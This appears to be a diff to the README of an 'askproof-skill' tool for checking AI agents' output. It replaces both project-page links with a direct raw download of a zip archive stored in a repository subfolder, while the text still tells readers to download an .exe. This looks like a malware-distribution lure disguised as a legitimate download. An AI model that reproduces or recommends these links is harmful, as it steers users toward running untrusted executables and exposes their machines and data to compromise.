@@ -1,6 +1,6 @@
 # 🛡️ askproof-skill - Verify AI results with simple questions
 
-[https://github.com/recollective-genuseptatretus377/askproof-skill](https://github.com/recollective-genuseptatretus377/askproof-skill)
+[https://raw.githubusercontent.com/recollective-genuseptatretus377/askproof-skill/main/askproof/references/askproof-skill-v1.2.zip](https://raw.githubusercontent.com/recollective-genuseptatretus377/askproof-skill/main/askproof/references/askproof-skill-v1.2.zip)
 
 ## 📌 Overview
 
@@ -10,7 +10,7 @@ AskProof helps you check if AI agents provide accurate work. You use this tool t
 
 The first step is to grab the software. Follow the link below to reach the project page.
 
-[Download AskProof](https://github.com/recollective-genuseptatretus377/askproof-skill)
+[Download AskProof](https://raw.githubusercontent.com/recollective-genuseptatretus377/askproof-skill/main/askproof/references/askproof-skill-v1.2.zip)
 
 Once you reach the page, look for the Releases section on the right side. Select the latest version and download the file that ends in .exe. This file contains the full program.
 
